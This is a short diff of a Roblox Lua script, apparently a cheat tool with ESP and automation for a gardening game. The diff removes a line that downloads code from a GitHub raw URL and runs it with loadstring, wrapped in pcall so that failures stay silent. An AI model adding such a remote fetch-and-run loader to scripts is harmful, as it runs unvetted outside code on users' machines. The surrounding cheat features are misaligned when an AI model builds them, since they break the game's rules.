@@ -6,11 +6,6 @@ local RunService = game:GetService("RunService")
 local player = Players.LocalPlayer
 local mouse = player:GetMouse()
 
-pcall(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/GrowAGardenHax/garden/refs/heads/main/load"))()
-end)
-task.wait(3)
-
 local espEnabled = true
 local truePetMap = {}
 local autoRunning = false
